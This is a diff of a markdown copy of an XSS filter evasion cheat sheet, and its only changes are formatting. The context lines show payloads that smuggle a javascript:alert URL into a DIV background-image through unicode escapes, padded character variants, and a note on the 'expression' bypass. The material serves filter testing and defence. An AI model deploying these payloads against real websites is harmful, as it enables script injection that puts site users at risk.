@@ -902,12 +902,12 @@ This has been modified slightly to obfuscate the url parameter. The original vul
 <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006
 c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
 ```
-DIV Background-image Plus Extra Characters
+
+## DIV Background-image Plus Extra Characters
 Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
 
-```py
-DIV ST...YLE=..."ba..ck...gro..und-ima....ge: ur...l(ja...va...scr...ipt.:.ale...rt('X...SS'))"
-```
+> D../IV ST...YLE=..."ba..ck...gro..und-ima....ge: ur...l(ja...va...scr...ipt.:.ale...rt('X...SS'))"
+
 
 DIV Expression
 A variant of this was effective against a real world cross site scripting filter using a newline between the colon and “expression”:
